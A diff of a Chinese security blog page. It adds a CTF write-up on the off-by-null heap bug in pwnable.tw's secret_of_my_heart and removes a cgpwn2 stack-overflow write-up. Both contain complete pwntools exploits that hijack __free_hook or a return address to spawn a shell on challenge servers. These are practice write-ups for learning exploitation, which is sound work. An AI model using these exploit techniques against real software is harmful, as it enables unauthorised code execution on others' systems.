@@ -251,6 +251,208 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/off by null漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/27/off by null漏洞/" itemprop="url">off by null漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T22:11:53+08:00">
+                2019-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/理论知识/" itemprop="url" rel="index">
+                    <span itemprop="name">理论知识</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h3><p>原文链接：<a href="https://www.anquanke.com/post/id/171283" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171283</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用pwnable.tw里面的secret_of_my_heart作为例题</span><br><span class="line">pwnable.tw不知道我为什么题目取不出来，只能直接学</span><br><span class="line">这个漏洞有点难懂 看了挺久的 为了解决easy_heap那一题</span><br><span class="line">首先介绍这题</span><br><span class="line"></span><br><span class="line">检查</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0.ssl.qhimg.com/t01f2284b432b1a2904.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该程序有三个功能</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p3.ssl.qhimg.com/t01bbb8a2557df61293.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分别是add、delete和show功能。</span><br><span class="line">程序刚开始使用mmap函数申请了一块内存:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p2.ssl.qhimg.com/t01027558b22eec9cf4.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里的mmap出的内存里面主要作用是用来存放一个个secret结构体</span><br><span class="line"></span><br><span class="line">sercet的结构体如下:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p3.ssl.qhimg.com/t01262ebc1ac1d814f1.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下面看一下add函数</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p2.ssl.qhimg.com/t0125397c8c5ad6f08f.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞点在add函数中的input_str函数中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p3.ssl.qhimg.com/t01626f07894f3a1ece.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">红框中的代码有泄露漏洞，可以泄露堆的地址</span><br><span class="line"></span><br><span class="line">而蓝框中的代码则是在输入的最后加上字节”\x00″，这样就造成了offbynull漏洞。</span><br><span class="line"></span><br><span class="line">看一下show函数的内容:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p5.ssl.qhimg.com/t0192cd1c5b4e12af0d.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再看一下delete函数中的内容:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p5.ssl.qhimg.com/t012eba25f6ca66c7ab.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、可以通过unsortedbin attack写入到free_hook上方，然后利用fastbin attack写入system的地址，从而拿到shell；</span><br><span class="line"></span><br><span class="line">2、可以通过fastbin attack修改malloc_hook为one_gadget，然后利用malloc_printerr触发malloc；</span><br><span class="line"></span><br><span class="line">3、可以通过fastbin attack修改_IO_FILE文件结构体的vtable中的函数地址为one_gadget来拿到shell；</span><br><span class="line"></span><br><span class="line">4、可以通过fastbin attack修改top chunk指针来劫持top chunk，拿到shell;</span><br></pre></td></tr></table></figure>
+
+<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一种思路的实现</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p3.ssl.qhimg.com/t013166d4cb63be868a.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是exp中的各个函数</span><br><span class="line"></span><br><span class="line">首先先去申请5个chunk和泄露堆的地址,大小分别有0x68和0xF8的</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t011505d3c31c553a2d.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">然后进行chunk overlap</span><br><span class="line"></span><br><span class="line">这里的大概思路是，通过3号chunk去溢出4号chunk的prevsize和size，使得当释放4号chunk时，去合并0-3号chunk。这里为了绕过unlink中出现的crash，我们需要先将0号chunk给free掉。 ![](YinXiangBiJi.enexfiles/chunkoverlap.png)</span><br><span class="line"></span><br><span class="line">这里需要说一下，p64(0x0)+p64(0x71)+p64(attack_heap)+p64(0x00)是为后面unsortedbin attack做准备，所以可以暂时忽略，后面的p64(0x100+0x100+0x70+0x70)是伪造的prev_size，这样去free掉4号chunk就可以将0-4号chunk合并并放入unsortedbin中。</span><br><span class="line"></span><br><span class="line">特别说明一下，attack_heap的地址为0x562b0fa382c0。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p5.ssl.qhimg.com/t01c0adaa3f43192db7.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以看到，这里已经实现了我们的目的。</span><br><span class="line"></span><br><span class="line">然后进行libc地址泄露</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p2.ssl.qhimg.com/t010087b8023e052b85.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们已经将0-4号合并的chunk放到了unsortedbin中，但1号chunk实际上并没有被我们free过，所以我们把在unsortedbin中的0号chunk申请掉，malloc就会切割chunk，并将unsortedbin的地址放到1号chunk里面，这时候我们去show1号chunk就可以得到unsortedbin地址了。</span><br><span class="line"></span><br><span class="line">我们已经将libc地址泄露了，接下来我们该如何利用这些chunk拿到shell呢？</span><br><span class="line"></span><br><span class="line">首先，我们先去free掉2号chunk,使得2号chunk放入fastbin中，那么现在堆的布局是怎样的呢？我们来看一下。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t012e1db7042552fe71.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样我们就可以通过去unsortedbin中取得内存，来控制0x562b0fa38200中的内容了.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t01828c065b94d4e0f7.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先new一个0xE8大小的内存。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p4.ssl.qhimg.com/t0102a11bac2b395543.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后通过new一块0x70+0x70大小的chunk，控制0x562b0fa38200中的prev_size为0,size为0x71，fd为attack_heap，也就是0x562b0fa382c0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p5.ssl.qhimg.com/t01c961a6cc0a1acfb0.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看一下0x562b0fa382c0中的情况</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p4.ssl.qhimg.com/t017fae9d0d3826d99e.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么0x562b0fa382c0中为什么回事这样呢，还记得前面吗？</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p1.ssl.qhimg.com/t010b034401eba4fbd4.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里我们对0x562b0fa382c0写入了p64(0x0)+p64(0x71)+p64(attack_heap)。</span><br><span class="line"></span><br><span class="line">这样，fastbin中就有了三个chunk，分别是0x562b0fa38200，0x562b0fa382c0，0x562b0fa382c0。</span><br><span class="line"></span><br><span class="line">接下来我们将0x562b0fa38200申请出来，然后通过申请0x562b0fa382c0这个chunk改变第二个0x562b0fa382c0的fd和unsortedbin中的chunk的bk。从而进行fastbin attack和unsortedbin attack。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0.ssl.qhimg.com/t018a8aa6e12d25fe39.png" alt></p>
+<p>还有四种方法自行原文学习 ，学一种我就快die了</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> = True</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./secret\_of\_my_heart"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bin_offset = 0x3C4B20 + 0x58</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10302"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bin_offset = 0x3C3B20 + 0x58</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./secret_of_my_heart"</span>)</span><br><span class="line"></span><br><span class="line">def new(size,name,secret):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(1))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Size of heart : "</span>,str(size))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"Name of heart :"</span>,name)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"secret of my heart :"</span>,secret)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(2))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(3))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"a"</span>*0x20,<span class="string">"aaaa"</span>)<span class="comment">#0 100</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"b"</span>*0x20,<span class="string">"bbbb"</span>)<span class="comment">#1 100</span></span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"b"</span>*0x20)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recvline()[:-1].ljust(0x8,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_address ===&gt; "</span> + hex(heap_addr))</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"c"</span>*0x20,<span class="string">"cccc"</span>)<span class="comment">#2 70</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"d"</span>*0x20,<span class="string">"dddd"</span>)<span class="comment">#3 70</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"d"</span>*0x20,<span class="string">"dddd"</span>)<span class="comment">#4 100</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"padding\n"</span>,<span class="string">"padding\n"</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">offset = 0x55a9d344a2c0 - 0x55a9d344a110</span><br><span class="line"></span><br><span class="line">attack_heap = heap_addr + offset</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"d"</span>*0x20,<span class="string">"d"</span>*0x40 + p64(0x0) + p64(0x71) + p64(attack_heap) + p64(0x00) + p64(0x100+0x100+0x70+0x70)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"a"</span>*0x20,<span class="string">"aaaa"</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Secret : "</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = u64(p.recvline()[:-1].ljust(0x8,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">libc.address = bin_addr - bin_offset</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_address ===&gt; "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"system_address ===&gt; "</span> + hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"__free_hook ===&gt; "</span> + hex(free_hook))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"attack_heap_address ===&gt; "</span> + hex(attack_heap))</span><br><span class="line"></span><br><span class="line">new(0xE8,<span class="string">"test"</span>,<span class="string">"test"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">new((0x70+0x70),<span class="string">"attack"</span>,p64(0x00)+p64(0x71)+p64(attack_heap)) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"test"</span>,<span class="string">"/bin/sh\x00"</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,p64(free_hook-0x43) + <span class="string">"\x00"</span> * 0x10 + p64(0x101)+p64(0xdeadbeef)+p64(free_hook-0x50))</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"attack"</span>,<span class="string">"attack"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span> * 0x33 + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,<span class="string">"attack"</span>)</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,payload)</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/python100例/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1568,153 +1770,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/cgpwn2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/cgpwn2/" itemprop="url">cgpwn2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T14:48:01+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec cgpwn2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/cgpwn2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">   只开启了nx保护</span><br><span class="line"></span><br><span class="line"> ida分析</span><br><span class="line"> char *hello()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // eax</span><br><span class="line">  signed int v1; // ebx</span><br><span class="line">  unsigned int v2; // ecx</span><br><span class="line">  char *v3; // eax</span><br><span class="line">  char s; // [esp+12h] [ebp-26h]</span><br><span class="line">  int v6; // [esp+14h] [ebp-24h]</span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = 30;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned int)&amp;s &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = 0;</span><br><span class="line">    v0 = (char *)&amp;v6;</span><br><span class="line">    v1 = 28;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = 0;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = 0;</span><br><span class="line">    v3 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 1 )</span><br><span class="line">    *v3 = 0;</span><br><span class="line">  puts(<span class="string">"please tell me your name"</span>);</span><br><span class="line">  fgets(name, 50, stdin);</span><br><span class="line">  puts(<span class="string">"hello,you can leave some message here:"</span>);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fgets(name, 50, stdin); 栈溢出漏洞</span><br><span class="line"></span><br><span class="line">.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br><span class="line"></span><br><span class="line">name 在bss段可以写入/bin/sh</span><br><span class="line"></span><br><span class="line">int pwn()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"echo hehehe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有system但是没有/bin/sh 需要自己写入</span><br><span class="line"></span><br><span class="line">00000026 s               db ?</span><br><span class="line">-00000025                 db ? ; undefined</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">.................</span><br><span class="line">00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line"></span><br><span class="line">溢出字节位42字节</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在找关键字符串的时候没有发现 bin/sh 。所以我们需要将bin/sh写到我们可以访问的地址中去。我们可以在输入name的时候把 bin/sh写进去。name位于bss段，bss段保存全局变量，加载地址不会因为地址随机化的开启而有所变化。</span><br><span class="line"></span><br><span class="line">将 system 的地址写到 hello 函数的返回地址中，同时将之前 bin/sh 的地址也写到栈中，作为system函数的参数</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通的栈溢出攻击 有system但是没有/bin/sh</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,48164)</span><br><span class="line">bin_sh_addr=0x0804A080</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">system_addr=0x08048420</span><br><span class="line">payload=<span class="string">'a'</span>*0x26+<span class="string">'a'</span>*4+p32(system_addr)+p32(system_addr)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
